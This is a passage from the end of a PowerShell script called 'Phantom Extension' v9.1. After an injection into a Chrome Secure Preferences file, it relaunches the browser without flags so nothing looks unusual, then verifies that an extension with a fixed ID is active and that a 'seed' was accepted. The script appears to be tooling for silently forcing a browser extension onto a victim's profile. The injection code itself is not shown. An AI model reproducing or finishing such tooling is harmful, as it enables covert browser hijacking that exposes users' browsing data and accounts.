    $diagAfter = [Phantom]::DiagnoseDump($secPrefs)
    Log "  After injection: $diagAfter"
}

# =============================================================================
# STEP 9: Launch Chrome normally
# =============================================================================
Log "STEP 9: Launching $($target.Name) normally (NO flags)..."
Start-Process $target.ExePath
Start-Sleep 12

$running = [bool](Get-Process $target.Proc -EA SilentlyContinue)
Log "  Browser running: $running"

# =============================================================================
# STEP 10: Post-launch verification
# =============================================================================
Log "STEP 10: Post-launch verification (after Chrome started)..."
Check-ExtensionState "POST-LAUNCH" $profileDir $EXT_ID

if (Test-Path $secPrefs) {
    $diagPost = [Phantom]::DiagnoseDump($secPrefs)
    Log "  Post-launch state: $diagPost"
}

Log "=========================================="
Log "DONE v9.1 - Phantom Extension"
Log "  Extension ID: $EXT_ID"
Log "  Seed verified: $($seed -ne $null)"
Log "=========================================="
